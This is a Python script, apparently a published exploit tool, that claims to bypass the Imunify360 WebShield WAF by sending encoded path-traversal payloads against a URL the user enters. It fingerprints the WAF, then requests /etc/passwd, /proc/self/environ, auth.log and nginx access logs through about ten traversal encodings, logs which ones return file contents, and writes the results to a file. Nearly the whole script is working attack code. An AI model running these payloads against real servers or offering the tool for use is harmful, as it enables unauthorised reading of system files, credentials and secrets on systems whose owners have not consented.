import requests
from datetime import datetime
from urllib.parse import urljoin

def print_banner():
    print("=" * 60)
    print("      Imunify360 WebShield 1.21 Bypass Tester")
    print("                 m10sec                      ")
    print("        CVE: Path Traversal Custom Bypass    ")
    print("=" * 60)

payloads = [
    "/%2e%2e/%2e%2e/%2e%2e",
    "/%252e%252e/%252e%252e/%252e%252e",
    "/..%2f..%2f..%2f",
    "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f",
    "//..//..//..//",
    "/..;/..;/..;/",
    "/../../../../%00",
    "/../../../../.",
    "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae",
    "/"
]

target_files = [
    "/etc/passwd",
    "/proc/self/environ",
    "/var/log/auth.log",
    "/var/log/nginx/access.log"
]

def detect_waf(base_url):
    try:
        res = requests.get(base_url, timeout=10)
        waf_signatures = ["imunify360", "cloudflare", "sucuri", "akamai", "f5", "fortiguard", "mod_security"]

        headers = " ".join(res.headers.values()).lower()
        for sig in waf_signatures:
            if sig in headers:
                print(f"[!] Posible WAF detectado: {sig}")
                return sig
        if res.status_code in [403, 406, 429]:
            print(f"[!] Código HTTP sospechoso: {res.status_code} (posible WAF)")
            return "unknown"
        print("[+] No se detectó un WAF evidente.")
        return None
    except Exception as e:
        print(f"[!] Error al verificar WAF: {e}")
        return None

def test_payloads(base_url):
    success = False
    logfile = open("waf_scan_results.txt", "w", encoding="utf-8")
    logfile.write(f"# Scan iniciado: {datetime.now()}\n")
    logfile.write(f"# Objetivo: {base_url}\n\n")

    for target_file in target_files:
        print(f"\n[+] Probando archivo sensible: {target_file}")
        logfile.write(f"\n## Archivo: {target_file}\n")

        for payload in payloads:
            # Usar urljoin para construir la URL correctamente, incluso con secuencias codificadas
            combined_path = payload + target_file
            url = urljoin(base_url, combined_path)

            print(f"   [>] Probing: {url}")
            logfile.write(f"Payload: {url}\n")

            try:
                res = requests.get(url, timeout=10)

                # Búsqueda de cadenas indicativas en el contenido para validar éxito
                if "root:" in res.text or "password" in res.text or "PATH=" in res.text:
                    print("   [✓] Bypass exitoso!")
                    logfile.write("  >>> ¡Bypass exitoso! <<<\n\n")
                    success = True
                else:
                    print("   [x] Falló o contenido no sensible.")
                    logfile.write("  Fallido.\n")

            except requests.exceptions.RequestException as e:
                print(f"   [!] Error: {e}")
                logfile.write(f"  Error: {e}\n")

    logfile.close()
    if not success:
        print("\n[!] No se encontró ningún bypass exitoso.")
    else:
        print("\n[✓] Resultados exitosos guardados en 'waf_scan_results.txt'.")

def main():
    print_banner()
    target = input("Introduce la URL del objetivo (ej: http://target.com): ").strip()

    if not target.startswith("http://") and not target.startswith("https://"):
        print("Error: La URL debe comenzar con http:// o https://")
        return

    detect_waf(target)
    test_payloads(target)

if __name__ == "__main__":
    main()
